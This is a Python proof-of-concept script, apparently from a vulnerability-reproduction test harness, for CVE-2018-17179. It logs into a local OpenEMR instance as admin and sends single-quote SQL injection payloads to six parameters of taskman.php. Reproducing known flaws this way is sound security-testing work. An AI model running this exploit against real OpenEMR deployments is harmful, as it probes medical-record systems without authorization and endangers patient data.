#!/usr/bin/env python3
"""
[APP] OpenEMR 
[CVE] CVE-2018-17179 
[TYPE] SQL injection
[METHOD] GET
[CRASH_FIELDS] from_id,to_id,pid,doc_type,doc_id,enc
[TARGET_URL] http://localhost/openemr/interface/forms/eye_mag/taskman.php
[PARAMS] from_id=1'&to_id=2'&pid=3'&doc_type=4'&doc_id=5'&enc=6'&action=make_task
OpenEMR SQL injection vulnerability that requires administrator authentication
First login to /interface/main/main_screen.php, then GET to /interface/forms/eye_mag/taskman.php
"""

import sys
import os

# Import standardized POC utilities
from utils import *

def main():
    # Extract metadata from this file's docstring
    metadata = get_poc_metadata_from_file(__file__)
    
    # CVE-2018-17179 specific configuration
    base_url = 'http://localhost/openemr'
    login_path = '/interface/main/main_screen.php?auth=login&site=default'
    
    # Login payload based on the provided configuration
    login_payload = {
        'new_login_session_management': '1',
        'authProvider': 'Default',
        'authUser': 'admin',
        'clearPass': 'pass',
        'languageChoice': '1'
    }
    
    # POC target URL and payload
    poc_url = 'http://localhost/openemr/interface/forms/eye_mag/taskman.php'
    poc_params = {
        'from_id': "1'",        # SQL injection payload
        'to_id': "2'",          # SQL injection payload
        'pid': "3'",            # SQL injection payload
        'doc_type': "4'",       # SQL injection payload
        'doc_id': "5'",         # SQL injection payload
        'enc': "6'",            # SQL injection payload
        'action': 'make_task'   # Action parameter (not part of crash fields)
    }
    
    # Run authenticated POC test using the helper function
    # Disable coverage during login as requested
    exit_code = run_authenticated_poc(
        base_url=base_url,
        login_path=login_path,
        login_payload=login_payload,
        poc_url=poc_url,
        poc_payload=poc_params,
        method=metadata['method'],
        cve_id=metadata['cve'],
        app_name=metadata['app'],
        vuln_type=metadata['type'],
    )
    
    sys.exit(exit_code)

if __name__ == '__main__':
    main()
